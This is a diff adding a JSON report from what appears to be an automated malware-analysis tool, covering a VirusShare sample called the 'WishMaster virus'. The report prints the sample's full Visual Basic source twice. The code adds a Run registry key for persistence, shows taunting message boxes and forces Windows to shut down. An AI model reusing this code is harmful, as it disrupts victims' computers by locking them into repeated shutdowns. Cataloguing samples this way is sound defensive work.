@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command1_Click": "Runs when the file is opened and ActiveX objects trigger events",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "Private Sub Command1_Click()\nSet reg = CreateObject(\"WScript.Shell\")\nreg.regwrite \"HKEY_LOCAL_MAHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start\", App.Path + \"\\\" + App.EXEName + \".exe\"\nMsgBox \"u fucked up. lol.\", vbInformation, \" you really fucked up lol\"\nDo: Loop\nOn Error Resume Next\n Shell \"rundll32.exe user.exe,exitwindows\"\n Shell \"Shutdown.exe -s\", vbMaximizeFocus - r\nEnd Sub\n\n\nPrivate Sub form_Load()\nSet reg = CreateObject(\"WScript.Shell\")\nreg.regwrite \"HKEY_LOCAL_MAHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start\", App.Path + \"\\\" + App.EXEName + \".exe\"\nMsgBox \"WishMaster Owns me and my comp. i willl now shut you down. if u dont want your comp to shutdown then click the command button.ha ha ha.\", vbInformation, \" U reallyfucked Up WishMaster virus.\"\nOn Error Resume Next\n Shell \"rundll32.exe user.exe,exitwindows\"\n Shell \"Shutdown.exe -s\", vbMaximizeFocus - r\nEnd Sub\n"
+    },
+    "filename": "VirusShare_27c1a0b129696114c51e56a287b74404",
+    "filesize": 920,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "27c1a0b129696114c51e56a287b74404",
+        "sha1": "6f70ef9642ef98f73f87415388c624e021de20dc",
+        "sha256": "844ebbd10072563fdee500d9cc3fbbdb8f3dbf084d7160fa2ac3e6744ae1b66e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Private Sub Command1_Click()",
+            "Set reg = CreateObject(\"WScript.Shell\")",
+            "reg.regwrite \"HKEY_LOCAL_MAHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start\", App.Path + \"\\\" + App.EXEName + \".exe\"",
+            "MsgBox \"u fucked up. lol.\", vbInformation, \" you really fucked up lol\"",
+            "Do: Loop",
+            "On Error Resume Next",
+            " Shell \"rundll32.exe user.exe,exitwindows\"",
+            " Shell \"Shutdown.exe -s\", vbMaximizeFocus - r",
+            "End Sub",
+            "Private Sub form_Load()",
+            "Set reg = CreateObject(\"WScript.Shell\")",
+            "reg.regwrite \"HKEY_LOCAL_MAHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start\", App.Path + \"\\\" + App.EXEName + \".exe\"",
+            "MsgBox \"WishMaster Owns me and my comp. i willl now shut you down. if u dont want your comp to shutdown then click the command button.ha ha ha.\", vbInformation, \" U reallyfucked Up WishMaster virus.\"",
+            "On Error Resume Next",
+            " Shell \"rundll32.exe user.exe,exitwindows\"",
+            " Shell \"Shutdown.exe -s\", vbMaximizeFocus - r",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263216",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
